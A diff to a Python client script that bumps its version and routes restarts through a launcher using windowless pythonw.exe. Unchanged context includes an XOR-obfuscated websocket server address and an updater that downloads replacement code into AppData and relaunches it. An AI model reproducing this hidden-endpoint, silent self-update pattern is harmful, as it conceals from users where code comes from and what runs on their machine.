@@ -20,7 +20,7 @@ def _get_self_hash() -> str:
         return ""
 
 # ── Version ───────────────────────────────────────────────────────────────────
-CURRENT_VERSION = "1.85"
+CURRENT_VERSION = "1.86"
 
 # ── Internal ──────────────────────────────────────────────────────────────────
 _x = bytes([b ^ 0x5A for b in [45,41,41,96,117,117,53,41,57,116,55,63,106,45,61,110,55,51,52,61,116,62,63]]).decode()
@@ -260,11 +260,12 @@ def check_for_updates():
 
         print(f"[*] Update downloaded – restarting...")
 
-        # Restart with updated script from AppData
-        python = os.path.join(os.path.dirname(os.path.abspath(_sys.executable)), "pythonw.exe")
+        # Restart via launcher.py so AppData client.py is picked up automatically
+        launcher = os.path.join(_BASE_DIR, "launcher.py")
+        python = os.path.join(_BASE_DIR, "python", "pythonw.exe")
         if not os.path.exists(python):
             python = _sys.executable
-        subprocess.Popen([python, script_path])
+        subprocess.Popen([python, launcher])
         os._exit(0)
 
     except Exception as e:
@@ -907,11 +908,12 @@ def open_settings_window(parent_root, click_x=None, click_y=None):
         python = os.path.join(os.path.dirname(os.path.abspath(_sys.executable)), "pythonw.exe")
         if not os.path.exists(python):
             python = _sys.executable
-        # Prefer AppData client.py if it exists (updated version), else fall back to install dir
-        _restart_script = os.path.join(_DATA_DIR, "client.py")
-        if not os.path.exists(_restart_script):
-            _restart_script = os.path.abspath(__file__)
-        subprocess.Popen([python, _restart_script])
+        # Restart via launcher.py so AppData client.py is picked up automatically
+        launcher = os.path.join(_BASE_DIR, "launcher.py")
+        python = os.path.join(_BASE_DIR, "python", "pythonw.exe")
+        if not os.path.exists(python):
+            python = _sys.executable
+        subprocess.Popen([python, launcher])
         os._exit(0)
 
     def on_role_change(*a):
